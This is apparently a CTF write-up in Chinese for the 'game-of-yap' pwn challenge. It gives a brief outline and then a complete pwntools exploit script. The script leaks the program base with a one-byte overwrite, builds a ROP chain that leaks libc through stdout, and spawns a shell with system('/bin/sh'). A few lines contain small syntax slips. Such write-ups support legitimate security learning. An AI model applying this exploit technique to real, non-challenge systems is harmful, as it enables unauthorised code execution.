# 思路-简单题
1. 泄漏play地址，程序基址
2. 泄漏libc地址
3. system()"/bin/sh")


# getshell
![](https://r2.20161023.xyz/pic/20250518213726868.png)



# 其他
```
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './game-of-yap'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF('./libc.so.6', checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "yap.chal.cyberjousting.com", 1355

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    b *main+79
    b *play+42
    b *flush_buf+70
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='game-of-yap')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    with log.progress("Leaking play address via yap+8"), context.silent:
        offset = 264
        payload = flat({offset : p64(elf.sym["yap"]+8)[:1]}) #Overwrite one byte
        io.sendafter("Here's your first chance...\n", payload)
        play = int(io.recvline().strip(),16)
        elf.address = play - elf.sym["play"]

    log.info("play: %#x", play)
    log.info("ELF base: %#x", elf.address)

    with log.progress("Return to main and leak stdout"), context.silent:
        rop = ROP(elf)
        rop.raw(rop.ret.address)
        rop.raw(elf.sym["nothing"]+12) #using putchars to get rsi = stdout+131
        rop.raw(0) # padding rbp
        rop.raw(elf.sym["yap"]+18) #rdi = %p & rsi = stdout+131
        rop.raw(0) # padding rbp
        rop.main() # return to main
        payload = flat({offset : [rop.chain()]})

        io.sendafter("One more try...\n", payload)
        io.recvline()
        stdout = int(io.recvline().strip(),16) - 131
        libc.address = stdout - libc.sym["_IO_2_1_stdout_"]

    log.info("_IO_2_1_stdout_: %#x", stdout)
    log.info("Libc base: %#x", libc.address)

    with log.progress("Get shell with ret2system"), context.silent:
        rop = ROP(libc)
        rop.raw(rop.ret.address)
        rop.system(next(libc.search(b"/bin/sh\x00")))
        payload = flat({offset : [rop.chain()]})
        io.sendafter("Here's your first chance...\n", payload)

    io.interactive()

if __name__ == '__main__':
    exploit)
```